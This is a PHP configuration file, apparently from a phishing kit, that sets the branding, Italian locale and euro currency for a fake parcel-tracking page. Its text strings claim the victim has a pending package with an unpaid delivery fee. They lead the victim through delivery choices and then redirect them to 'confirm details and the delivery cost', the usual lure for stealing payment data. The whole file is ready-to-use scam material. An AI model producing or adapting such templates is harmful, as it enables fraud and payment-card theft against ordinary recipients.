<?php

// product
$wallID = "1";

// brand
$brandLogo = "/templates/brands/q4s822u33dh.png";
$favicon = "/templates/brands/b4kq6dq40g.png";
$mainColor = "rgb(219,0,54)";
$secondaryColor = "rgb(219,0,54)";
$headerColor = "#fff";
$white = "";

// geo
$geo = "it";
$langTag = "it";
$currency = "€";

// texts
$texts = [
    "us-dhh" => [
        "title" => "Monitoraggio &amp; Tracciamento",
        "text1" => "CONSEGNA IN SOSPESO",
        "text2" => "Hai (1) pacco in sospeso.",
        "text3" => "Il tuo pacco è stato ritirato",
        "text4" => "Pacco# AIPD-1512-KL10",
        "text5" => "Il tuo pacco è pronto per la consegna!",
        "text6" => "Pacco in sospeso",
        "text7" => "Si prega di confermare i dettagli di consegna nella pagina successiva",
        "text8" => "Costo di consegna non pagato dal venditore",
        "text9" => "Si prega di confermare i dettagli della consegna nella pagina successiva",
        "text10" => "Il tuo codice di tracciamento",
        "text11" => "Continua",
        "text12" => "Localizzazione del tuo pacco...",
        "text13" => "Ricerca del numero di tracciamento...",
        "text14" => "Ricerca delle opzioni di consegna...",
        "text15" => "Informazioni sul pacco:",
        "text16" => "Contenuto per lettera di vettura:",
        "text17" => "Stato:",
        "text18" => "Pronto per la spedizione",
        "text19" => "Spedizione tramite:",
        "text20" => "Costo di spedizione:",
        "text21" => "In sospeso",
        "text22" => "Pianifica la tua consegna ora",
        "text23" => "Come desideri ricevere il tuo ordine?",
        "text24" => "Consegna a domicilio/lavoro",
        "text25" => "Vado a ritirarlo io",
        "text26" => "Dove desideri che venga consegnato?",
        "text27" => "A casa",
        "text28" => "Al lavoro",
        "text29" => "Quando desideri la tua consegna?",
        "text30" => "Giorni feriali",
        "text31" => "Fine settimana",
        "text32" => "Salvataggio delle tue preferenze",
        "text33" => "Conferma del tuo pacco",
        "text34" => "Il pacco è prenotato!",
        "text35" => "CONFERMA ORDINE",
        "text36" => "Consegna prevista:",
        "text37" => "Tra le 8:30 e le 18:00",
        "text38" => "1. Verrai reindirizzato alla pagina del venditore.",
        "text39" => "2. Si prega di confermare i tuoi dettagli e il costo di consegna.",
        "text40" => "3. Una volta completato, la data di consegna prevista è elencata sopra.",
        "text41" => "PAGINA SUCCESSIVA",
        "text42" => "*Firma richiesta al momento della consegna",
        "text43" => "2024 © - tutti i diritti riservati",
        "text44" => "Sito | Account | FAQ | Connettiti",
        "text45" => "Il pacco è già nel deposito."
    ]
];

?>